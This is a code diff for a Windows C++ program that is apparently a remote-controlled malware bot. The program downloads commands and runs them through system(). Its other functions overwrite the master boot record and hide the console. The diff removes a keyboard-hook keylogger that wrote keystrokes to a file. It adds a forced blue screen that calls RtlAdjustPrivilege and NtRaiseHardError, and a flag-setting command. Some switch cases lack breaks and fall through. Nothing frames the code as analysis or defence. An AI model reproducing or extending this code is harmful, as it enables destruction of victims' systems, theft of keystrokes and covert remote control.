@@ -10,8 +10,13 @@
 #include <cstdio>
 #include "download.h"
 #include "LCb.h"
+#include "rwFlags.h"
+#include <winternl.h>
+typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
-std::ofstream logfile("C:\\Bootstrap\\keyslog");
+
+std::string flagsFile = "C:\\Bootstrap\\flags";
 
 bool isRegistryKeyExists(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH") {
     HKEY hKey;
@@ -21,17 +26,6 @@ bool isRegistryKeyExists(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH") {
         return true;
     }
     return false;
-}
-
-LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
-    if (code == HC_ACTION) {
-        KBDLLHOOKSTRUCT *p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-        char c = static_cast<char>(p->vkCode);
-        logfile << c;
-        logfile.flush();
-    }
-
-    return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
 //mode it been released in 6.0 or when I have time
@@ -87,9 +81,14 @@ int _WriteMBR() { // used from Zer0Mem0ry
  * @throws None
  */
 void _CallBSoD() {
-	HANDLE hFile = NULL;
-	hFile = CreateFileW(L"C:\\$MFT\\BSoDFile", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
-	CloseHandle(hFile);
+	BOOLEAN bEnabled;
+    ULONG uResp;
+    LPVOID lpFuncAddress = (LPVOID)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+    LPVOID lpFuncAddress2 = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
+    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
+    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
 }
 
 /**
@@ -153,62 +152,6 @@ int GetRegistryKeyValue(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH", co
 }
 
 /**
- * Reads a configuration file and sets certain flags based on the contents of the file.
- *
- * @throws Error opening the file or reading its contents.
- */
-/*
-void readConfFile() {
-    const char header = '!';
-    const char newline = '&';
-    const vector<string> names = {
-        "BS", "RMBR", "RW", "CKPC", "CURI", "IRK"
-    };
-
-    char buffer;
-    string Buffer;
-    ifstream f("X:\\051DD118572A366E");
-
-    if (f) {
-        buffer = f.get();
-        if (buffer == header) {
-            f.seekg(2);
-            for (int i = 0; i < 4; i++) {
-                buffer = f.get();
-                Buffer += buffer;
-                if (buffer != header) {
-                    auto it = std::find(names.begin(), names.end(), buffer);
-
-                    if (it != names.end()) {
-                        switch (Buffer) {
-                            case names[0]:
-                                BS = true;
-                                break;
-                            case names[1]:
-                                RMBR = true;
-                                break;
-                            case names[2]:
-                                RW = true;
-                                break;
-                            case names[3]:
-                                CKPC = true;
-                                break;
-                            case names[4]:
-                                CURI = true;
-                                break;
-                            case names[5]:
-                                IRK = true;
-                                break;
-                        }
-                    }
-                }
-            }
-        }
-    }
-    f.close();
-}
-*/
-/**
  * Reboots the system by executing the "shutdown" command with the specified arguments.
  *
  * @param None
@@ -244,23 +187,54 @@ void CodeGamma() {
     _WriteMBR();
 }
 
+void CodeDelta() {
+    _CallBSoD();
+}
+
+/**
+ * Writes the callback for the given contents.
+ *
+ * @param contents the pointer to the contents to be written
+ * @param size the size of each element in the contents
+ * @param nmemb the number of elements in the contents
+ * @param output the string to append the contents to
+ *
+ * @return the total size of the appended contents
+ *
+ * @throws None
+ */
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
     size_t totalSize = size * nmemb;
     output->append(static_cast<char*>(contents), totalSize);
     return totalSize;
 }
 
-std::string parseCommand() {
-    std::ifstream file(downloadFile());
-    std::string output;
-    if (file.is_open()) {
-        std::string line;
-        while (std::getline(file, line)) {
-            output += line;
-        }
-        file.close();
+/**
+ * Parses a command and returns the result as a string.
+ *
+ * @param useInteralCommand Flag indicating whether to use an internal command (default: false).
+ * @param interalCommand The internal command to use (default: "no int command").
+ *
+ * @return The parsed command as a string.
+ *
+ * @throws ErrorType If there is an error parsing the command.
+ */
+std::string parseCommand(bool useInteralCommand = false, std::string interalCommand = "nocom") {
+    if (useInteralCommand) {
+        return interalCommand;
     }
-    return output;
+    else {
+        std::ifstream file(downloadFile());
+        std::string output;
+        if (file.is_open()) {
+            std::string line;
+            while (std::getline(file, line)) {
+                output += line;
+            }
+            file.close();
+        }
+        return output;
+    }
 }
 
 void handleCommand(std::string command = parseCommand()) {
@@ -298,10 +272,13 @@ void handleCommand(std::string command = parseCommand()) {
                     return CodeBeta();
                 case 'g':
                     return CodeGamma();
-                case 'c':
+                case 'c': //custom command
                     buffer = command.substr(8, 32767);
                     system(buffer.c_str());
-                    break;
+                case 'f': //set flags
+                    rwFlags(command[8], command.substr(10, 14), flagsFile, std::stoi(command.substr(16, 24)));
+                case 'd':
+                    return CodeDelta();
             }
         }
     } catch (...) {
@@ -309,14 +286,21 @@ void handleCommand(std::string command = parseCommand()) {
     }
 }
 
-int main() {
-    bool isDebbuging = true;
+int main(int argc, char* argv[]) {
+    if (argc > 1) {
+        handleCommand(parseCommand(true, argv[1]));
+    }
+    bool isDebbuging = false;
     if (isDebbuging) {
         std::cout << GetRegistryKeyValue() << std::endl;
         std::cout << isRegistryKeyExists() << std::endl;
         std::cout << "NOTE: If the output of console is: stoi then the ID isn't correct!" << std::endl;
     }
+    else {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    }
     while (true) {
         handleCommand();
+        Sleep(rwFlags('r', "RS", flagsFile, 0));
     }
 }
